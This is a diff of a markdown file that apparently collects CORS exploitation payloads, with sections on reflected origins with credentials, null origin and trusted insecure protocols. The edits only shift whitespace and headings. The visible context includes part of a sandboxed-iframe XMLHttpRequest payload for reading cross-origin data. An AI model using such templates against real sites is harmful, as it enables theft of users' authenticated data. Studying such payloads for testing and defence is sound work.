@@ -1,7 +1,5 @@
 # CORS reflect origin, Allow Credentials : true
-
 ```html
-
 <html>
 
     <body>
@@ -19,11 +17,10 @@
     </body>
 
 </html>
-
 ```
 
-# Origin null
 
+# Origin null
 ```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
     var req = new XMLHttpRequest();
@@ -36,6 +33,8 @@
     };
 </script>"></iframe>
 ```
+
+
 # CORS vulnerability with trusted insecure protocols
 ```html
 <html>
